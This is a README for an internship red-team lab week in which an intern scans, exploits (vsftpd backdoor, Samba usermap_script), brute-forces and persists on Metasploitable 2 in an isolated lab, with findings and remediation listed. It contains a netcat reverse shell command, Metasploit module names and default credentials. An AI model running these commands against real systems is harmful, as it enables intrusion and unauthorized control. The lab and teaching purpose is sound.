# Week 2 — Red Team Fundamentals & Vulnerability Assessment

**CyArt Cybersecurity Internship**  
**Intern:** Aman Gour  
**Institution:** SVIT Hyderabad  
**Engagement Date:** May 21–23, 2026  
**Classification:** Confidential — Internal Use Only

---

## Overview

This folder contains all documentation, notes, and evidence for Week 2 of the CyArt Cybersecurity Internship. The week focused on foundational red team techniques including network reconnaissance, vulnerability assessment, exploitation, post-exploitation persistence, and password security auditing.

All activities were conducted in an **isolated VirtualBox lab environment** with explicit authorization as part of the CyArt internship program. No real production systems were targeted.

---

## Lab Environment

| Component | IP Address | Role |
|-----------|-----------|------|
| Kali Linux (Attacker) | 10.0.2.15 | Red Team Operator |
| Metasploitable 2 (Target) | 10.0.2.3 | Vulnerable Target |
| Network | Isolated VirtualBox Lab | NAT Network |

---

## Theory Topics Covered

| # | Topic | Key Concepts |
|---|-------|-------------|
| 1 | Fundamentals of Red Teaming | Attack lifecycle, MITRE ATT&CK framework, TTPs |
| 2 | Reconnaissance & Information Gathering | Passive vs active recon, OSINT, Nmap, theHarvester |
| 3 | Exploitation & Vulnerability Assessment | CVEs, CVSS scoring, Metasploit, OpenVAS |
| 4 | Post-Exploitation & Persistence | Lateral movement, reverse shells, crontab, Mimikatz |
| 5 | Reporting & Red Team Operations | Rules of Engagement, PTES reporting, executive briefing |

---

## Practical Labs Summary

### Lab 1 — Network Reconnaissance (Nmap)

Performed four Nmap scan types against Metasploitable 2 to enumerate services, detect OS, and identify vulnerabilities.

| Scan Type | Command | Result |
|-----------|---------|--------|
| Service Version | `nmap -sC -sV 10.0.2.3` | 23 open ports, full service versions |
| Stealth Scan | `nmap -sS 10.0.2.3` | 23 ports in 0.71 seconds, low detectability |
| Aggressive Scan | `nmap -A 10.0.2.3` | OS fingerprint, NSE scripts, 21.98 seconds |
| SYN Scan | `nmap -sS -p- 10.0.2.3` | Full port range scan |

**Key Finding:** 23 open ports exposing vsftpd 2.3.4, Samba 3.0.20, Apache 2.2.8, MySQL 5.0.51a, an open root shell on port 1524, and 19 other services.

---

### Lab 2 — Vulnerability Assessment (OpenVAS)

Ran a Full and Fast OpenVAS scan to identify CVEs and assign CVSS scores.

| # | Vulnerability | Port | CVSS | Severity |
|---|--------------|------|------|----------|
| 1 | vsftpd 2.3.4 Backdoor | 21/tcp | 10.0 | Critical |
| 2 | Samba usermap_script RCE | 445/tcp | 10.0 | Critical |
| 3 | Metasploitable Root Shell | 1524/tcp | 10.0 | Critical |
| 4 | Anonymous FTP Login | 21/tcp | 7.5 | High |
| 5 | Telnet Enabled (Plaintext) | 23/tcp | 7.0 | High |
| 6 | Apache httpd 2.2.8 Outdated | 80/tcp | 6.8 | High |
| 7 | SMB Signing Disabled | 445/tcp | 6.5 | Medium |

**Total: 4 Critical | 2 High | 1 Medium**

---

### Lab 3 — Exploitation (Metasploit)

Exploited two critical vulnerabilities to achieve root-level access on Metasploitable 2.

**Exploit 1 — vsftpd 2.3.4 Backdoor**

| Field | Detail |
|-------|--------|
| Module | `exploit/unix/ftp/vsftpd_234_backdoor` |
| Target | 10.0.2.3:21 |
| Result | ROOT SHELL — uid=0(root) gid=0(root) |

**Exploit 2 — Samba usermap_script RCE**

| Field | Detail |
|-------|--------|
| Module | `exploit/multi/samba/usermap_script` |
| Target | 10.0.2.3:445 |
| Result | ROOT SHELL — uid=0(root) gid=0(root) |

Both exploits independently yielded full root access demonstrating redundant critical vulnerabilities.

---

### Lab 4 — Post-Exploitation & Persistence

Established persistent access using native tools after initial exploitation.

**Netcat Reverse Shell:**
- Listener: `nc -lvnp 4444` on Kali (10.0.2.15)
- Initiator: `nc -e /bin/bash 10.0.2.15 4444` on target
- Result: Reverse shell as `msfadmin` (uid=1000)

**Crontab Persistence:**
- Method: Cron job scheduled every 5 minutes
- Command: `echo 'Hello' > /tmp/test.txt`
- Result: Persistence confirmed and active across reboots

---

### Lab 5 — Password Security (Hydra + KeePassXC)

**Hydra Brute Force against FTP:**

| Test | Username | Password | Result |
|------|----------|----------|--------|
| 1 | msfadmin | msfadmin | SUCCESS — Default credential confirmed |
| 2 | admin | password123 | FAILED |

**KeePassXC Password Audit:** Generated and audited 5 strong passwords (16+ characters, mixed case, numbers, symbols) — all rated Strong.

---

## Key Findings

| Finding ID | Vulnerability | CVSS | Remediation |
|------------|--------------|------|-------------|
| FID001 | vsftpd 2.3.4 Backdoor (CVE-2011-2523) | 10.0 | Upgrade vsftpd immediately |
| FID002 | Samba usermap_script RCE (CVE-2007-2447) | 10.0 | Patch Samba, restrict SMB access |
| FID003 | Open Root Shell on Port 1524 | 10.0 | Disable bindshell, firewall port 1524 |
| FID004 | Anonymous FTP Access | 7.5 | Disable anonymous FTP login |
| FID005 | Telnet Enabled (Plaintext) | 7.0 | Replace Telnet with SSH |
| FID006 | Apache httpd 2.2.8 Outdated | 6.8 | Upgrade Apache to latest version |
| FID007 | SMB Signing Disabled | 6.5 | Enable SMB signing to prevent MITM |

---

## MITRE ATT&CK Mapping

| Phase | Technique ID | Technique Name | Tool Used |
|-------|-------------|----------------|-----------|
| Reconnaissance | T1046 | Network Service Discovery | Nmap |
| Initial Access | T1190 | Exploit Public-Facing Application | Metasploit |
| Execution | T1059 | Command and Scripting Interpreter | Netcat, Shell |
| Persistence | T1053.003 | Scheduled Task/Job: Cron | Crontab |
| Credential Access | T1110 | Brute Force | Hydra |
| Discovery | T1082 | System Information Discovery | Nmap -A |

---

## Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| Nmap | 7.99 | Network reconnaissance & port scanning |
| OpenVAS | Latest | Automated vulnerability scanning |
| Metasploit Framework | Latest | Exploitation |
| Netcat | Latest | Reverse shell & persistence |
| Hydra | Latest | Password brute forcing |
| KeePassXC | Latest | Password management & auditing |

---

## Folder Structure

```
Week 2/
├── README.md                        # This file
├── CyArt_Week2_Report.docx          # Full engagement report
├── screenshots/
│   ├── nmap_service_scan.png        # nmap -sC -sV output
│   ├── nmap_stealth_scan.png        # nmap -sS output
│   ├── nmap_aggressive_scan.png     # nmap -A output
│   ├── openvas_scan_results.png     # OpenVAS vulnerability scan
│   ├── exploit1_vsftpd_root.png     # vsftpd backdoor root shell
│   ├── exploit2_samba_root.png      # Samba RCE root shell
│   ├── netcat_reverse_shell.png     # Netcat reverse shell
│   ├── crontab_persistence.png      # Cron job persistence
│   ├── hydra_brute_force.png        # Hydra FTP brute force
│   └── keepassxc_audit.png          # KeePassXC password audit
└── notes/
    └── week2_notes.txt              # Raw lab notes
```

---

## Executive Summary (Non-Technical)

During this security assessment, the red team gained full administrative (root) control of the test server using two independent attack paths — both requiring zero authentication. The server was found running outdated software with known backdoors that have been public knowledge since 2007 and 2011. Additionally, an open root shell was discovered accessible to anyone on the network, and default credentials were confirmed on the FTP service. These findings represent critical risk and require immediate patching, service hardening, and network access controls.

---

## Disclaimer

> All activities documented in this repository were performed in a controlled, isolated lab environment as part of the CyArt Cybersecurity Internship program at SVIT Hyderabad. All targets were intentionally vulnerable systems (Metasploitable 2) owned and operated within the intern's personal VirtualBox environment. No unauthorized systems were accessed. This documentation is intended for educational purposes only.

---

*CyArt Cybersecurity Internship | Week 2 | Aman Gour | May 2026*
